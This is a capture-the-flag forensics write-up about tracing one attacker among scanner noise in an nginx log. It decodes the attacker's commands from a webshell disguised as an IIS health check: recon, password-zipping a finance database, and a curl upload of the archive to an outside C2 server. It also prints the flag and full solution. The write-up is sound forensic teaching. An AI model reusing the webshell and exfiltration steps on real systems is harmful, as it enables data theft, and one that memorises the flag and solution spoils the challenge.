# Не пойман — не медоед (HoneyLeak) — write-up

**Flag:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
**Class:** Forensics · **Difficulty:** Baby/Easy · **Points:** n/a · **Teams solved:** n/a
**Author:** @mrvos, SPbCTF

**One-paragraph story of the solve.** A single nginx access log, flooded with decoy
scanner traffic, hides one real attacker session that only reveals itself through
User-Agent frequency (a UA that appears just 4 times out of 56,873 lines). Base64-decoding
the four requests to a disguised ASPX webshell reconstructs the whole kill chain: recon →
zip the accounting DB with a password → upload to a C2 → self-verify. The archive password
is a deliberate decoy answer, not the flag — the real secret sits **inside** the stolen DB,
and reaching it means pulling the *correct* archive off the C2 not by filename/timestamp
(a race condition in the attacker's own script plus 1,338 decoy blobs) but by content — the
`PK\x03\x04` ZIP signature.

---

## 1. The Challenge

The bees' **accounting database** vanished from the server. The only evidence saved before
the incident was cleaned up is a single nginx access log:

```
honeyleak_access.log   56,873 lines   nginx "combined" format   03/Jul/2026 15:00–22:59 UTC
```

Reconstruct the thief's actions, find the stolen DB, and determine **what secret the bees
were hiding in the corporate accounting**. That secret is the flag.

## 2. Recon

- Standard nginx combined log: IP, timestamp, `"METHOD path HTTP/ver"`, status, response
  size, referrer, User-Agent.
- Only `GET`/`HEAD`/`OPTIONS` appear — no `POST` at all, so any file upload (webshell
  plant, exfil) is invisible directly in the log; the webshell must have been planted
  out-of-band.
- Two large traffic groups are visible on sight: ~12 IPs with a normal browser profile
  (real UAs, real app paths like `/api/news`, `/products`, `/about`) and ~12 IPs with a
  scanner profile (masscan/sqlmap/ffuf/gobuster/feroxbuster/Wfuzz/dirsearch/DirBuster/Nmap
  NSE/python-requests/Go-http-client) grinding through random backup/dump paths
  (`/orders.sql`, `/db_backup.sql`, `/phpMyAdmin-*/`, …), almost all `403/404/405/500`.
- `awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l` → **27** distinct UAs in
  the whole file — small enough to profile by frequency.

## 3. How We Got There (hypothesis logic)

- **Observation.** The log is deliberately seeded with "looks like a DB leak" paths —
  dozens of IPs methodically probe `*.sql`, `*.sqlite`, `*backup*`, `phpMyAdmin`, almost
  all `403/404`.
- **Hypothesis (dead end).** The obvious first move is to grep for "DB-ish" paths and look
  for the one that returned `200`. **This is a trap the author built**: dozens of IPs do
  exactly this and none succeed — there's no signal there, only noise.
- **Testing via UA frequency instead.** Counted every UA's frequency:
  `awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn`. 26 of 27 UAs
  appear hundreds-to-thousands of times (scanner tools + simulated browsers + bots).
  Exactly **one** — `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` —
  appears only **4 times** (`grep -c "Trident/6.0"` → 4). That rarity *is* the signal.
- **Hypothesis.** All 4 requests belong to the same attacker, and given how rare that UA
  is against the noise floor, this is probably the real attack.
- **Confirmed.** Status codes on those 4 requests are all **200**, on a path everyone else
  got `403/404` on. IP: `185.193.88.77`.
- **Observation (complication).** That same IP `185.193.88.77` also fired ~1,166 requests
  using every noisy scanner UA — i.e. it isn't a "clean" attacker IP distinct from the
  scanners; the scanner noise and the real attack share the same source address.
- **Hypothesis for why.** The attacker generated their own decoy recon from the same IP so
  the 4 real hits would drown in self-made noise — camouflage inside their own traffic,
  not just incidental background noise from others.
- **Confirmed.** `grep "185.193.88.77" ... | awk -F'"' '{print $3}' | awk '{print $1}' |
  sort | uniq -c` → 4×200 (the real attack) + 1,162 requests at 301/302/403/404/405/500
  (self-generated camouflage recon).
- **Finding the endpoint.** All 4 signal requests hit one path:
  `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64 PowerShell>` — a webshell
  disguised as an IIS health check. 7 other IPs probe the generic `/aspnet_client/`
  directory (all `403/404/301`), but none of them ever request `healthcheck.aspx` itself —
  the exact filename+param wasn't found by brute force, the attacker already knew it (the
  shell was planted out-of-band).
- **Reconstructing the chain.** Base64-decoded `cmd=` on all 4 requests (tight window
  18:40:17→18:42:37 UTC): recon (`whoami && hostname && ipconfig`) → zip the DB
  `corp_finance_2026_07_03.sql` into a password-protected archive
  (`7z.exe -pS7m!vQ2@rK9Lp4X_2026`) → upload to C2 `http://178.154.230.44/upload.php` via
  `curl.exe -F` → self-check (`curl ... | findstr blob_`).
- **Hypothesis (dead end #1 — "the password is the flag").** The archiving step exposes a
  password, `S7m!vQ2@rK9Lp4X_2026`, in plain sight. Tempting to wrap it in `avito{...}` and
  submit. **This is also a trap** — our very first pass did exactly that and wrote
  `avito{S7m!vQ2@rK9Lp4X_2026}` into `FLAG.txt`, and it was wrong. The task explicitly asks
  for the secret *inside* the DB; the password only opens the archive, it isn't the secret
  itself. An independent second pass re-read the objective and corrected the flag.
- **Hypothesis (dead end #2 — "find the blob by time/name").** Since the upload happened
  at 18:42:11 with filename `blob_$ts.tmp`, it seems reasonable to look on the C2 for a
  file timestamped `~18:42`. The C2 (`http://178.154.230.44/`) turned out to be a **live**
  open-directory listing (`README.txt`: *"Public index mirror. Auto cleanup disabled."*) of
  **1,338** decoy `blob_*.{tmp,log,txt,bin,dat,cache}` files, roughly one per minute across
  the whole day, all filled with random bytes and no ZIP header. The file at minute 18:42
  is also a decoy.
- **Why the time/name search fails: a bug in the attacker's own script.** The archiving
  step (18:41:05) computes `$ts` **once** and writes `blob_20260703_1841.tmp` — but the
  upload step (18:42:11), **66 seconds later**, is a *separate* `powershell -c` invocation
  that **recomputes** `$ts` and tries to upload `blob_20260703_1842.tmp`, a file that was
  never created. `curl.exe -F "file=@<missing path>"` fails locally before anything is sent
  to the C2. The final "verification" (`findstr /I blob_`) is a false positive — *some*
  `blob_*` always exists on the C2 index, so it proves nothing. **The real archive never
  actually left the host through this exfil call.**
- **Working idea.** Ignore filenames/timestamps, find the archive **by content**: a
  `7z a -tzip` archive must start with the ZIP signature `PK\x03\x04`. Range-probed
  (`Range: bytes=0-3`) the first bytes of all 1,338 blobs — exactly one matched:
  `blob_3po654ppbr.log` (12 MB, `504b0304`). That's the real exfiltrated archive, spared
  from the timestamp bug either by luck or by being a separate/earlier successful attempt.

## 4. The Vulnerability

This isn't a "vulnerability" in the web sense — it's a forensic reconstruction with several
deliberate traps built in:
1. Decoy traffic masks the real attack by volume, not by UA rarity/status-code
   uniqueness — a classic failure mode of detecting by "known-bad paths" instead of
   behavioral anomalies.
2. The archive password and the final secret are different things; the objective
   explicitly asks for the secret *inside* the DB, not the key to the archive.
3. The attacker's own PowerShell script has a race condition (`$ts` recomputed across two
   separate invocations) — the exfil they *believed* succeeded actually didn't; the real
   artifact was only recoverable by content, independent of the broken upload metadata.

## 5. Exploit — Step by Step

1. Frequency-profile UAs to find the one rare outlier (4 hits out of 56,873):
   ```bash
   awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn
   grep -c "Trident/6.0" honeyleak_access.log      # -> 4
   ```
2. Confirm all 4 hits share one IP and status 200 on a unique path:
   ```bash
   grep "Trident/6.0" honeyleak_access.log
   ```
3. Base64-decode all 4 `cmd=` values to recover the DB path, archive password, and C2 URL
   (see `recover_secret.py`, `analyze_log()`).
4. Pull the C2's directory listing and find the real archive by ZIP signature, not by
   name/timestamp:
   ```bash
   curl -s http://178.154.230.44/ | grep -o 'blob_[^"]*' > blobs.txt
   for b in $(cat blobs.txt); do
     magic=$(curl -s -r 0-3 "http://178.154.230.44/$b" | xxd -p)
     [ "$magic" = "504b0304" ] && echo "$b"
   done
   # -> blob_3po654ppbr.log
   curl -s http://178.154.230.44/blob_3po654ppbr.log -o real_blob.bin
   ```
5. Extract with the password from step 3 and read the secret:
   ```bash
   unzip -P 'S7m!vQ2@rK9Lp4X_2026' real_blob.bin
   cat corp_finance_2026_07_03.sql   # plain SQL dump
   ```
   `secrets.incident_flag` in the dump is the flag.
6. All of the above is reproduced end-to-end by `recover_secret.py` (see §8): it parses the
   log, recovers the password/DB path/C2 URL, and either re-discovers the archive on the
   (still-live) C2 by magic bytes (`--probe-c2`) or uses the already-downloaded
   `real_blob.bin`.

## 6. Flag

```
avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}
```

## 7. Takeaways

1. **Profile by frequency, not by "looks suspicious".** The rarest UA (4 of 56,873) was
   the entire signal; grepping for "suspicious paths" was a trap with dozens of false
   positives built in.
2. **Read the whole objective before submitting the first secret you find.** The archive
   password looks like a satisfying answer and even "unlocks" the story — but the task
   asks for the secret *inside* the object, not the key to it. The first pass got exactly
   this wrong.
3. **Recover artifacts by content, not by metadata.** Filename and timestamp were
   deliberately unreliable here (a race condition in the attacker's own script); the
   `PK\x03\x04` signature via range requests was the only reliable filter among 1,338
   decoys.

## 8. Artifacts

- `recover_secret.py` — curated script: parses `honeyleak_access.log`, decodes the
  webshell commands, recovers the password/DB path/C2 URL, optionally re-discovers the
  archive on the C2 by ZIP magic bytes, and extracts the flag from the `secrets` table of
  the unpacked dump. `ruff check` / `ty check` — clean.
- `NOTES.md` — the first (wrong) pass, which stopped at the archive password.
- `NOTES_FABLE.md` — the independent second pass that recovered the real DB and corrected
  the flag.
- `real_blob.bin` — the already-downloaded real archive (12 MB, ZIP).
- `extract/corp_finance_2026_07_03.sql`, `extract/encrypted_database.dat` — the archive's
  unpacked contents (the second file is a decoy bundled inside the archive, not needed for
  the flag).
- `FLAG.txt`.
